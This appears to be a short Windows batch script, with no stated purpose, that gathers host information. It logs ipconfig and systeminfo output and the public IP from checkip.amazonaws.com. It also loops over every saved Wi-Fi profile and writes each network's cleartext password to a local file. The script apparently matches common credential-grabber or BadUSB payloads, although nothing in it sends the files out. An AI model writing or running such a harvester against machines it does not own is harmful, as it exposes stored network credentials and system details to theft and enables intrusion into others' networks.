ipconfig >> ipconfig.txt
systeminfo >> systeminfo.txt
for /f "skip=9 tokens=1,2 delims=:" %%i in ('netsh wlan show profiles') do @if "%%j" NEQ "" (echo SSID: %%j & netsh wlan show profile %%j key=clear) >> infowifi.txt
curl checkip.amazonaws.com >> ip.txt